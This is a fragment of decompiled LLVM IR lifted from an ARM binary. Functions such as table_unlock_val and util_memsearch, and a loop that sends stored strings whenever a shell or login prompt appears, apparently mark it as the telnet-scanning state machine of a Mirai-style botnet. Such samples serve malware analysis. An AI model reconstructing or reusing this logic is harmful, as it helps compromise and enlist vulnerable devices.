dec_label_pc_e620.lr.ph:                          ; preds = %dec_label_pc_e614.preheader, %dec_label_pc_e614.loopexit
  %v0_e620189 = phi i32 [ %v0_e614, %dec_label_pc_e614.loopexit ], [ %v0_e614156, %dec_label_pc_e614.preheader ]
  br label %dec_label_pc_e620

dec_label_pc_e620:                                ; preds = %dec_label_pc_e618.backedge.thread, %dec_label_pc_e618.backedge, %dec_label_pc_e618.backedge.thread526, %dec_label_pc_e620.lr.ph
  %v0_f040 = phi i32 [ %v0_e620189, %dec_label_pc_e620.lr.ph ], [ %v0_e620186, %dec_label_pc_e618.backedge ], [ %v0_e694, %dec_label_pc_e618.backedge.thread ], [ %v0_e694, %dec_label_pc_e618.backedge.thread526 ]
  %v1_e620 = add i32 %v0_f040, 24
  %v2_e620 = inttoptr i32 %v1_e620 to i32*
  %v3_e620 = load i32, i32* %v2_e620, align 4
  store i32 %v3_e620, i32* @r3, align 4
  %v2_e624 = icmp ugt i32 %v3_e620, 255
  store i1 %v2_e624, i1* %cpsr_c.global-to-local, align 1
  %v7_e624 = icmp eq i32 %v3_e620, 256
  store i1 %v7_e624, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_f040, 28
  store i32 %.pre, i32* @sl, align 4
  br i1 %v7_e624, label %dec_label_pc_f040, label %dec_label_pc_e630

dec_label_pc_e630:                                ; preds = %dec_label_pc_e620, %dec_label_pc_f040
  store i32 0, i32* @r6, align 4
  %v1_e634 = load i32, i32* @sb, align 4
  %v2_e634 = inttoptr i32 %v1_e634 to i32*
  store i32 0, i32* %v2_e634, align 4
  %v0_e638 = load i32, i32* @r5, align 4
  %v1_e638 = add i32 %v0_e638, 24
  %v2_e638 = inttoptr i32 %v1_e638 to i32*
  %v3_e638 = load i32, i32* %v2_e638, align 4
  store i32 %v3_e638, i32* %r2.global-to-local, align 4
  %v0_e63c = load i32, i32* @sl, align 4
  %v2_e63c = add i32 %v0_e63c, %v3_e638
  store i32 %v2_e63c, i32* @r4, align 4
  %v1_e640 = add i32 %v0_e638, 4
  %v2_e640 = inttoptr i32 %v1_e640 to i32*
  %v3_e640 = load i32, i32* %v2_e640, align 4
  store i32 %v3_e640, i32* %r0.global-to-local, align 4
  %v1_e644 = sub i32 256, %v3_e638
  store i32 %v1_e644, i32* %r2.global-to-local, align 4
  store i32 %v2_e63c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e650 = call i32 @__libc_recv(i32 %v3_e640, i32 %v2_e63c, i32 %v1_e644, i32 16384)
  store i32 %v4_e650, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e654 = icmp eq i32 %v4_e650, 0
  store i1 %v2_e654, i1* %cpsr_z.global-to-local, align 1
  %tmp383 = icmp slt i32 %v4_e650, 1
  br i1 %tmp383, label %dec_label_pc_e6cc, label %dec_label_pc_e65c

dec_label_pc_e65c:                                ; preds = %dec_label_pc_e630
  %v0_e65c = load i32, i32* @r6, align 4
  store i32 %v0_e65c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e660

dec_label_pc_e660:                                ; preds = %.thread63, %dec_label_pc_e65c
  %v3_e66c = phi i32 [ %v1_e670, %.thread63 ], [ %v0_e65c, %dec_label_pc_e65c ]
  %v1_e660 = load i32, i32* @r4, align 4
  %v2_e660 = add i32 %v1_e660, %v3_e66c
  %v3_e660 = inttoptr i32 %v2_e660 to i8*
  %v4_e660 = load i8, i8* %v3_e660, align 1
  %v6_e660 = zext i8 %v4_e660 to i32
  store i32 %v6_e660, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e664 = icmp eq i8 %v4_e660, 0
  store i1 %v2_e664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e664, label %bb384, label %.thread63

bb384:                                            ; preds = %dec_label_pc_e660
  %v2_e668 = add nuw nsw i32 %v6_e660, 65
  store i32 %v2_e668, i32* %r3.global-to-local, align 4
  %v2_e66c = trunc i32 %v2_e668 to i8
  store i8 %v2_e66c, i8* %v3_e660, align 1
  %v0_e670.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread63

.thread63:                                        ; preds = %dec_label_pc_e660, %bb384
  %v0_e670 = phi i32 [ %v3_e66c, %dec_label_pc_e660 ], [ %v0_e670.pre, %bb384 ]
  %v1_e670 = add i32 %v0_e670, 1
  store i32 %v1_e670, i32* %r2.global-to-local, align 4
  %v3_e674 = icmp uge i32 %v1_e670, %v4_e650
  store i1 %v3_e674, i1* %cpsr_c.global-to-local, align 1
  %v9_e674 = icmp eq i32 %v1_e670, %v4_e650
  store i1 %v9_e674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e674, label %dec_label_pc_e67c, label %dec_label_pc_e660

dec_label_pc_e67c:                                ; preds = %.thread63, %dec_label_pc_e6d0
  store i32 ptrtoint (i32* @global_var_20f84.119 to i32), i32* @ip, align 4
  %v0_e680 = load i32, i32* @r5, align 4
  %v1_e680 = add i32 %v0_e680, 24
  %v2_e680 = inttoptr i32 %v1_e680 to i32*
  %v3_e680 = load i32, i32* %v2_e680, align 4
  %v2_e684 = load i32, i32* @global_var_20f84.119, align 4
  store i32 %v2_e684, i32* %r2.global-to-local, align 4
  %v2_e688 = add i32 %v3_e680, %v4_e650
  store i32 %v2_e688, i32* %r3.global-to-local, align 4
  store i32 %v2_e688, i32* %v2_e680, align 4
  %v0_e690 = load i32, i32* %r2.global-to-local, align 4
  %v1_e690 = load i32, i32* @r5, align 4
  %v2_e690 = add i32 %v1_e690, 8
  %v3_e690 = inttoptr i32 %v2_e690 to i32*
  store i32 %v0_e690, i32* %v3_e690, align 4
  br label %dec_label_pc_e694

dec_label_pc_e694:                                ; preds = %dec_label_pc_e7b4, %dec_label_pc_e67c
  %v0_e694 = load i32, i32* @r5, align 4
  %v1_e694 = add i32 %v0_e694, 12
  %v2_e694 = inttoptr i32 %v1_e694 to i32*
  %v3_e694 = load i32, i32* %v2_e694, align 4
  store i32 %v3_e694, i32* %r0.global-to-local, align 4
  %v1_e698 = add i32 %v3_e694, -2
  store i32 %v1_e698, i32* @r3, align 4
  %v7_e69c = icmp eq i32 %v1_e698, 8
  store i1 %v7_e69c, i1* %cpsr_z.global-to-local, align 1
  %v5_e6a0 = and i32 %v1_e698, 1073741824
  %v6_e6a0 = icmp ne i32 %v5_e6a0, 0
  store i1 %v6_e6a0, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_e694, label %dec_label_pc_e618.backedge [
    i32 2, label %dec_label_pc_edec
    i32 3, label %dec_label_pc_ec00
    i32 4, label %dec_label_pc_ecf8
    i32 5, label %dec_label_pc_eb2c
    i32 6, label %dec_label_pc_e984
    i32 7, label %dec_label_pc_e8b0
    i32 8, label %dec_label_pc_ea58
    i32 9, label %dec_label_pc_e7dc
    i32 10, label %dec_label_pc_e738
  ]

dec_label_pc_e6cc:                                ; preds = %dec_label_pc_e630
  br i1 %v2_e654, label %dec_label_pc_f25c, label %dec_label_pc_e6d0

dec_label_pc_e6d0:                                ; preds = %dec_label_pc_e6cc
  %v3_e6d0 = icmp eq i32 %v4_e650, -1
  store i1 %v3_e6d0, i1* %cpsr_c.global-to-local, align 1
  %v8_e6d0 = icmp eq i32 %v4_e650, -1
  store i1 %v8_e6d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e6d0, label %dec_label_pc_e6d8, label %dec_label_pc_e67c

dec_label_pc_e6d8:                                ; preds = %dec_label_pc_e6d0
  %v0_e6d8 = load i32, i32* @sb, align 4
  %v1_e6d8 = inttoptr i32 %v0_e6d8 to i32*
  %v2_e6d8 = load i32, i32* %v1_e6d8, align 4
  store i32 %v2_e6d8, i32* %r3.global-to-local, align 4
  %v2_e6dc = icmp ugt i32 %v2_e6d8, 10
  store i1 %v2_e6dc, i1* %cpsr_c.global-to-local, align 1
  %v7_e6dc = icmp eq i32 %v2_e6d8, 11
  store i1 %v7_e6dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e6dc, label %dec_label_pc_e720, label %dec_label_pc_e6e4

dec_label_pc_e6e4:                                ; preds = %dec_label_pc_e6d8, %dec_label_pc_f25c
  %v0_e6e4 = load i32, i32* @r5, align 4
  %v1_e6e4 = add i32 %v0_e6e4, 4
  %v2_e6e4 = inttoptr i32 %v1_e6e4 to i32*
  %v3_e6e4 = load i32, i32* %v2_e6e4, align 4
  store i32 %v3_e6e4, i32* %r0.global-to-local, align 4
  %v1_e6e8 = call i32 @__GI___libc_close(i32 %v3_e6e4)
  store i32 %v1_e6e8, i32* %r0.global-to-local, align 4
  %v0_e6ec = load i32, i32* @r5, align 4
  %v1_e6ec = add i32 %v0_e6ec, 284
  %v2_e6ec = inttoptr i32 %v1_e6ec to i8*
  %v3_e6ec = load i8, i8* %v2_e6ec, align 1
  %v4_e6ec = zext i8 %v3_e6ec to i32
  %v1_e6f0 = add nuw nsw i32 %v4_e6ec, 1
  %v1_e6f4 = urem i32 %v1_e6f0, 256
  store i32 %v1_e6f4, i32* %r3.global-to-local, align 4
  %v2_e6f8 = icmp ugt i32 %v1_e6f4, 8
  store i1 %v2_e6f8, i1* %cpsr_c.global-to-local, align 1
  %v7_e6f8 = icmp eq i32 %v1_e6f4, 9
  store i1 %v7_e6f8, i1* %cpsr_z.global-to-local, align 1
  %v1_e6fc = trunc i32 %v1_e6f0 to i8
  store i8 %v1_e6fc, i8* %v2_e6ec, align 1
  %v0_e700 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_e700 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_e700 = xor i1 %v1_e700, true
  %v3_e700 = and i1 %v0_e700, %v2_e700
  br i1 %v3_e700, label %bb385, label %.thread293

.thread293:                                       ; preds = %dec_label_pc_e6e4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v1_e70c289294 = load i32, i32* @r5, align 4
  %v2_e70c290295 = add i32 %v1_e70c289294, 4
  %v3_e70c291296 = inttoptr i32 %v2_e70c290295 to i32*
  store i32 -1, i32* %v3_e70c291296, align 4
  br label %bb386

bb385:                                            ; preds = %dec_label_pc_e6e4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_e70c285 = load i32, i32* @r5, align 4
  %v2_e70c286 = add i32 %v1_e70c285, 4
  %v3_e70c287 = inttoptr i32 %v2_e70c286 to i32*
  store i32 -1, i32* %v3_e70c287, align 4
  %v4_e710 = load i32, i32* %r0.global-to-local, align 4
  %v5_e710 = load i32, i32* @r5, align 4
  %v6_e710 = add i32 %v5_e710, 12
  %v7_e710 = inttoptr i32 %v6_e710 to i32*
  store i32 %v4_e710, i32* %v7_e710, align 4
  %v4_e714 = load i32, i32* %r3.global-to-local, align 4
  %v5_e714 = trunc i32 %v4_e714 to i8
  %v6_e714 = load i32, i32* @r5, align 4
  %v7_e714 = add i32 %v6_e714, 284
  %v8_e714 = inttoptr i32 %v7_e714 to i8*
  store i8 %v5_e714, i8* %v8_e714, align 1
  %v0_e718.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_e718.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb386

bb386:                                            ; preds = %.thread293, %bb385
  %v1_e71c = phi i1 [ %v1_e718.pre, %bb385 ], [ %v0_e700, %.thread293 ]
  %v0_e71c = phi i1 [ %v0_e718.pre, %bb385 ], [ %v1_e700, %.thread293 ]
  %v2_e718 = xor i1 %v1_e71c, true
  %v3_e718 = or i1 %v0_e71c, %v2_e718
  br i1 %v3_e718, label %bb387, label %bb388

bb387:                                            ; preds = %bb386
  %v4_e718 = load i32, i32* @r5, align 4
  store i32 %v4_e718, i32* %r0.global-to-local, align 4
  br label %bb388

bb388:                                            ; preds = %bb386, %bb387
  store i32 59168, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_e718, i32 ptrtoint (i32* @global_var_ccd4.496 to i32))
  br label %dec_label_pc_e720

dec_label_pc_e720:                                ; preds = %dec_label_pc_e614.loopexit, %dec_label_pc_e618.backedge, %dec_label_pc_e614.preheader, %dec_label_pc_e6d8, %dec_label_pc_e5f8, %dec_label_pc_e5ac, %dec_label_pc_f180, %bb388
  %v3_e720 = load i16, i16* %stack_var_-52, align 2
  %v4_e720 = sext i16 %v3_e720 to i32
  store i32 %v4_e720, i32* %r3.global-to-local, align 4
  %v1_e724 = add nsw i32 %v4_e720, 1
  store i32 %v1_e724, i32* @r4, align 4
  %v2_e728 = icmp ugt i32 %v1_e724, 254
  store i1 %v2_e728, i1* %cpsr_c.global-to-local, align 1
  %v7_e728 = icmp eq i32 %v1_e724, 255
  store i1 %v7_e728, i1* %cpsr_z.global-to-local, align 1
  %v5_e72c = trunc i32 %v1_e724 to i16
  store i16 %v5_e72c, i16* %stack_var_-52, align 2
  %v7_e730 = icmp sgt i16 %v3_e720, 254
  br i1 %v7_e730, label %dec_label_pc_dfe0, label %dec_label_pc_e5ac

dec_label_pc_e738:                                ; preds = %dec_label_pc_e694
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_e73c = call i32 @table_unlock_val(i32 28)
  store i32 %v2_eca4, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  %v3_e74c = call i32 @table_retrieve_val(i32 28, i32* %v2_ecac)
  %v3_e750 = load i8, i8* %stack_var_-56, align 1
  %v4_e750 = sext i8 %v3_e750 to i32
  store i32 %v3_e74c, i32* %r2.global-to-local, align 4
  %v1_e758 = add nsw i32 %v4_e750, -1
  store i32 %v1_e758, i32* %r3.global-to-local, align 4
  %v0_e75c = load i32, i32* @sl, align 4
  store i32 %v0_e75c, i32* %r0.global-to-local, align 4
  %v0_e760 = load i32, i32* @r5, align 4
  %v1_e760 = add i32 %v0_e760, 24
  %v2_e760 = inttoptr i32 %v1_e760 to i32*
  %v3_e760 = load i32, i32* %v2_e760, align 4
  store i32 %v3_e760, i32* %r1.global-to-local, align 4
  %v4_e764 = call i32 @util_memsearch(i32 %v0_e75c, i32 %v3_e760, i32 %v3_e74c, i32 %v1_e758)
  %v2_e768 = icmp eq i32 %v4_e764, -1
  store i1 %v2_e768, i1* %cpsr_c.global-to-local, align 1
  %v7_e768 = icmp eq i32 %v4_e764, -1
  store i1 %v7_e768, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_e764, i32* @r4, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_ef74 = call i32 @table_lock_val(i32 28)
  br i1 %v7_e768, label %dec_label_pc_ef70, label %dec_label_pc_e774

dec_label_pc_e774:                                ; preds = %dec_label_pc_e738
  store i32 %v1_ef74, i32* %r0.global-to-local, align 4
  %v0_e77c = load i32, i32* @r5, align 4
  %v1_e77c = add i32 %v0_e77c, 4
  %v2_e77c = inttoptr i32 %v1_e77c to i32*
  %v3_e77c = load i32, i32* %v2_e77c, align 4
  store i32 %v3_e77c, i32* %r0.global-to-local, align 4
  %v1_e780 = call i32 @__GI___libc_close(i32 %v3_e77c)
  store i32 %v1_e780, i32* %r0.global-to-local, align 4
  %v0_e784 = load i32, i32* @r5, align 4
  %v1_e784 = add i32 %v0_e784, 284
  %v2_e784 = inttoptr i32 %v1_e784 to i8*
  %v3_e784 = load i8, i8* %v2_e784, align 1
  %v4_e784 = zext i8 %v3_e784 to i32
  %v1_e788 = add nuw nsw i32 %v4_e784, 1
  %v1_e78c = urem i32 %v1_e788, 256
  store i32 %v1_e78c, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_e794 = icmp ugt i32 %v1_e78c, 9
  store i1 %v2_e794, i1* %cpsr_c.global-to-local, align 1
  %v7_e794 = icmp eq i32 %v1_e78c, 10
  store i1 %v7_e794, i1* %cpsr_z.global-to-local, align 1
  %v2_e798 = add i32 %v0_e784, 4
  %v3_e798 = inttoptr i32 %v2_e798 to i32*
  store i32 -1, i32* %v3_e798, align 4
  %v0_e79c = load i32, i32* @r3, align 4
  %v1_e79c = trunc i32 %v0_e79c to i8
  %v2_e79c = load i32, i32* @r5, align 4
  %v3_e79c = add i32 %v2_e79c, 284
  %v4_e79c = inttoptr i32 %v3_e79c to i8*
  store i8 %v1_e79c, i8* %v4_e79c, align 1
  %v0_e7a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e7a0, label %dec_label_pc_e7a4, label %dec_label_pc_f064

dec_label_pc_e7a4:                                ; preds = %dec_label_pc_e774
  store i32 0, i32* @r3, align 4
  %v1_e7a8 = load i32, i32* @r5, align 4
  %v2_e7a8 = add i32 %v1_e7a8, 12
  %v3_e7a8 = inttoptr i32 %v2_e7a8 to i32*
  store i32 0, i32* %v3_e7a8, align 4
  %v0_e7ac = load i32, i32* @r3, align 4
  %v1_e7ac = trunc i32 %v0_e7ac to i8
  %v2_e7ac = load i32, i32* @r5, align 4
  %v3_e7ac = add i32 %v2_e7ac, 284
  %v4_e7ac = inttoptr i32 %v3_e7ac to i8*
  store i8 %v1_e7ac, i8* %v4_e7ac, align 1
  br label %dec_label_pc_e7b0

dec_label_pc_e7b0:                                ; preds = %dec_label_pc_f064, %dec_label_pc_e7a4
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_e7b4

dec_label_pc_e7b4:                                ; preds = %dec_label_pc_ede0, %dec_label_pc_eba8, %dec_label_pc_ead4, %dec_label_pc_ea00, %dec_label_pc_e92c, %dec_label_pc_e858, %dec_label_pc_e7b0
  %v0_e7b4 = load i32, i32* @r5, align 4
  %v1_e7b4 = add i32 %v0_e7b4, 24
  %v2_e7b4 = inttoptr i32 %v1_e7b4 to i32*
  %v3_e7b4 = load i32, i32* %v2_e7b4, align 4
  %v0_e7b8 = load i32, i32* @r7, align 4
  %v2_e7b8 = sub i32 %v0_e7b8, %v3_e7b4
  %v3_e7b8 = icmp uge i32 %v0_e7b8, %v3_e7b4
  store i1 %v3_e7b8, i1* %cpsr_c.global-to-local, align 1
  %v4_e7b8 = xor i32 %v0_e7b8, %v3_e7b4
  %v5_e7b8 = xor i32 %v2_e7b8, %v0_e7b8
  %v6_e7b8 = and i32 %v5_e7b8, %v4_e7b8
  %v7_e7b8 = icmp slt i32 %v6_e7b8, 0
  %v8_e7b8 = icmp slt i32 %v2_e7b8, 0
  %v9_e7b8 = icmp eq i32 %v0_e7b8, %v3_e7b4
  store i1 %v9_e7b8, i1* %cpsr_z.global-to-local, align 1
  %v2_e7bc = xor i1 %v8_e7b8, %v7_e7b8
  %v0_e7b8.v3_e7b4 = select i1 %v2_e7bc, i32 %v0_e7b8, i32 %v3_e7b4
  store i32 %v0_e7b8.v3_e7b4, i32* %r1.global-to-local, align 4
  %v2_e7c4 = sub i32 %v3_e7b4, %v0_e7b8.v3_e7b4
  store i32 %v2_e7c4, i32* @r2, align 4
  store i32 %v2_e7c4, i32* %v2_e7b4, align 4
  %v0_e7cc = load i32, i32* @sl, align 4
  %v1_e7cc = load i32, i32* %r1.global-to-local, align 4
  %v2_e7cc = add i32 %v1_e7cc, %v0_e7cc
  store i32 %v2_e7cc, i32* @r1, align 4
  store i32 %v0_e7cc, i32* @r0, align 4
  %v3_e7d4 = call i32 @memmove(i32 %v0_e7cc, i32 %v2_e7cc, i32 %v2_e7c4)
  store i32 %v3_e7d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e694

dec_label_pc_e7dc:                                ; preds = %dec_label_pc_e694
  %v1_e7dc = add i32 %v0_e694, 24
  %v2_e7dc = inttoptr i32 %v1_e7dc to i32*
  %v3_e7dc = load i32, i32* %v2_e7dc, align 4
  store i32 %v3_e7dc, i32* %r2.global-to-local, align 4
  %v1_e7e0 = add i32 %v3_e7dc, -1
  store i32 %v1_e7e0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e7e4 = icmp eq i32 %v1_e7e0, 0
  store i1 %v2_e7e4, i1* %cpsr_z.global-to-local, align 1
  %tmp391 = icmp slt i32 %v1_e7e0, 1
  br i1 %tmp391, label %dec_label_pc_e618.backedge.thread, label %dec_label_pc_e7ec

dec_label_pc_e7ec:                                ; preds = %dec_label_pc_e7dc
  %v2_e7ec = add i32 %v1_e7e0, %v0_e694
  store i32 %v2_e7ec, i32* %r3.global-to-local, align 4
  %v1_e7f0 = add i32 %v2_e7ec, 28
  %v2_e7f0 = inttoptr i32 %v1_e7f0 to i8*
  %v3_e7f0 = load i8, i8* %v2_e7f0, align 1
  %v4_e7f0 = zext i8 %v3_e7f0 to i32
  store i32 %v4_e7f0, i32* %r3.global-to-local, align 4
  %v2_e7f4 = icmp ugt i8 %v3_e7f0, 61
  store i1 %v2_e7f4, i1* %cpsr_c.global-to-local, align 1
  %v7_e7f4 = icmp eq i8 %v3_e7f0, 62
  store i1 %v7_e7f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e7f4, label %dec_label_pc_e858, label %bb392

bb392:                                            ; preds = %dec_label_pc_e7ec
  %v3_e7f8 = icmp ugt i8 %v3_e7f0, 57
  store i1 %v3_e7f8, i1* %cpsr_c.global-to-local, align 1
  %v8_e7f8 = icmp eq i8 %v3_e7f0, 58
  store i1 %v8_e7f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e7f8, label %dec_label_pc_e858, label %dec_label_pc_e800

dec_label_pc_e800:                                ; preds = %bb392
  %v2_e800 = icmp ugt i8 %v3_e7f0, 35
  store i1 %v2_e800, i1* %cpsr_c.global-to-local, align 1
  %v7_e800 = icmp eq i8 %v3_e7f0, 36
  store i1 %v7_e800, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e800, label %dec_label_pc_e858, label %dec_label_pc_e808

dec_label_pc_e808:                                ; preds = %dec_label_pc_e800
  %v2_e808 = icmp ugt i8 %v3_e7f0, 34
  store i1 %v2_e808, i1* %cpsr_c.global-to-local, align 1
  %v7_e808 = icmp eq i8 %v3_e7f0, 35
  store i1 %v7_e808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e808, label %dec_label_pc_e858, label %dec_label_pc_e810

dec_label_pc_e810:                                ; preds = %dec_label_pc_e808
  %v2_e810 = icmp ugt i8 %v3_e7f0, 36
  store i1 %v2_e810, i1* %cpsr_c.global-to-local, align 1
  %v7_e810 = icmp eq i8 %v3_e7f0, 37
  store i1 %v7_e810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e810, label %dec_label_pc_e858, label %dec_label_pc_e840.preheader

dec_label_pc_e840.preheader:                      ; preds = %dec_label_pc_e810
  %v3_e814 = add i32 %v0_e694, 28
  %v2_e818 = add i32 %v3_e814, %v3_e7dc
  store i32 %v2_e818, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e840

dec_label_pc_e824:                                ; preds = %bb393
  %v2_e824 = icmp ugt i8 %v3_e848, 35
  store i1 %v2_e824, i1* %cpsr_c.global-to-local, align 1
  %v7_e824 = icmp eq i8 %v3_e848, 36
  store i1 %v7_e824, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e824, label %dec_label_pc_e858, label %dec_label_pc_e82c

dec_label_pc_e82c:                                ; preds = %dec_label_pc_e824
  %v2_e82c = icmp ugt i8 %v3_e848, 34
  store i1 %v2_e82c, i1* %cpsr_c.global-to-local, align 1
  %v7_e82c = icmp eq i8 %v3_e848, 35
  store i1 %v7_e82c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e82c, label %dec_label_pc_e858, label %dec_label_pc_e834

dec_label_pc_e834:                                ; preds = %dec_label_pc_e82c
  %v2_e834 = icmp ugt i8 %v3_e848, 36
  store i1 %v2_e834, i1* %cpsr_c.global-to-local, align 1
  %v7_e834 = icmp eq i8 %v3_e848, 37
  store i1 %v7_e834, i1* %cpsr_z.global-to-local, align 1
  %v1_e838 = add i32 %v0_e838, -1
  store i32 %v1_e838, i32* %r3.global-to-local, align 4
  br i1 %v7_e834, label %dec_label_pc_e858, label %dec_label_pc_e840

dec_label_pc_e840:                                ; preds = %dec_label_pc_e840.preheader, %dec_label_pc_e834
  %v0_e838 = phi i32 [ %v2_e818, %dec_label_pc_e840.preheader ], [ %v1_e838, %dec_label_pc_e834 ]
  %v0_e840 = phi i32 [ %v1_e7e0, %dec_label_pc_e840.preheader ], [ %v1_e840, %dec_label_pc_e834 ]
  %v1_e840 = add i32 %v0_e840, -1
  store i32 %v1_e840, i32* %r1.global-to-local, align 4
  %v2_e840 = icmp ne i32 %v0_e840, 0
  store i1 %v2_e840, i1* %cpsr_c.global-to-local, align 1
  %v7_e840 = icmp eq i32 %v0_e840, 1
  store i1 %v7_e840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e840, label %dec_label_pc_e618.backedge.thread526, label %dec_label_pc_e848

dec_label_pc_e848:                                ; preds = %dec_label_pc_e840
  %v1_e848 = add i32 %v0_e838, -2
  %v2_e848 = inttoptr i32 %v1_e848 to i8*
  %v3_e848 = load i8, i8* %v2_e848, align 1
  %v4_e848 = zext i8 %v3_e848 to i32
  store i32 %v4_e848, i32* %r2.global-to-local, align 4
  %v2_e84c = icmp ugt i8 %v3_e848, 61
  store i1 %v2_e84c, i1* %cpsr_c.global-to-local, align 1
  %v7_e84c = icmp eq i8 %v3_e848, 62
  store i1 %v7_e84c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e84c, label %dec_label_pc_e858, label %bb393

bb393:                                            ; preds = %dec_label_pc_e848
  %v3_e850 = icmp ugt i8 %v3_e848, 57
  store i1 %v3_e850, i1* %cpsr_c.global-to-local, align 1
  %v8_e850 = icmp eq i8 %v3_e848, 58
  store i1 %v8_e850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e850, label %dec_label_pc_e858, label %dec_label_pc_e824

dec_label_pc_e858:                                ; preds = %dec_label_pc_e848, %bb393, %dec_label_pc_e834, %dec_label_pc_e82c, %dec_label_pc_e824, %dec_label_pc_e810, %dec_label_pc_e7ec, %dec_label_pc_e808, %dec_label_pc_e800, %bb392
  %v0_e85c = phi i32 [ %v1_e7e0, %dec_label_pc_e810 ], [ %v1_e7e0, %dec_label_pc_e7ec ], [ %v1_e7e0, %dec_label_pc_e808 ], [ %v1_e7e0, %dec_label_pc_e800 ], [ %v1_e7e0, %bb392 ], [ %v1_e840, %dec_label_pc_e824 ], [ %v1_e840, %dec_label_pc_e82c ], [ %v1_e840, %dec_label_pc_e834 ], [ %v1_e840, %bb393 ], [ %v1_e840, %dec_label_pc_e848 ]
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_e85c = add i32 %v0_e85c, 1
  store i32 %v1_e85c, i32* @r7, align 4
  %v1_e860 = call i32 @table_unlock_val(i32 26)
  store i32 %v2_ec90, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_e870 = call i32 @table_retrieve_val(i32 26, i32* nonnull %stack_var_-60)
  store i32 %v3_e870, i32* %r0.global-to-local, align 4
  %v3_e874 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_e874, i32* %r2.global-to-local, align 4
  store i32 %v3_e870, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e880 = load i32, i32* @r5, align 4
  %v1_e880 = add i32 %v0_e880, 4
  %v2_e880 = inttoptr i32 %v1_e880 to i32*
  %v3_e880 = load i32, i32* %v2_e880, align 4
  store i32 %v3_e880, i32* %r0.global-to-local, align 4
  %v4_e884 = call i32 @__libc_send(i32 %v3_e880, i32 %v3_e870, i32 %v3_e874, i32 16384)
  store i32 %v4_e884, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_186ec.498 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e894 = load i32, i32* @r5, align 4
  %v1_e894 = add i32 %v0_e894, 4
  %v2_e894 = inttoptr i32 %v1_e894 to i32*
  %v3_e894 = load i32, i32* %v2_e894, align 4
  store i32 %v3_e894, i32* %r0.global-to-local, align 4
  %v4_e898 = call i32 @__libc_send(i32 %v3_e894, i32 ptrtoint ([3 x i8]* @global_var_186ec.498 to i32), i32 2, i32 16384)
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_e8a0 = call i32 @table_lock_val(i32 26)
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_e8a8 = load i32, i32* @r5, align 4
  %v2_e8a8 = add i32 %v1_e8a8, 12
  %v3_e8a8 = inttoptr i32 %v2_e8a8 to i32*
  store i32 10, i32* %v3_e8a8, align 4
  br label %dec_label_pc_e7b4

dec_label_pc_e8b0:                                ; preds = %dec_label_pc_e694
  %v1_e8b0 = add i32 %v0_e694, 24
  %v2_e8b0 = inttoptr i32 %v1_e8b0 to i32*
  %v3_e8b0 = load i32, i32* %v2_e8b0, align 4
  store i32 %v3_e8b0, i32* %r2.global-to-local, align 4
  %v1_e8b4 = add i32 %v3_e8b0, -1
  store i32 %v1_e8b4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e8b8 = icmp eq i32 %v1_e8b4, 0
  store i1 %v2_e8b8, i1* %cpsr_z.global-to-local, align 1
  %tmp394 = icmp slt i32 %v1_e8b4, 1
  br i1 %tmp394, label %dec_label_pc_e618.backedge.thread, label %dec_label_pc_e8c0

dec_label_pc_e8c0:                                ; preds = %dec_label_pc_e8b0
  %v2_e8c0 = add i32 %v1_e8b4, %v0_e694
  store i32 %v2_e8c0, i32* %r3.global-to-local, align 4
  %v1_e8c4 = add i32 %v2_e8c0, 28
  %v2_e8c4 = inttoptr i32 %v1_e8c4 to i8*
  %v3_e8c4 = load i8, i8* %v2_e8c4, align 1
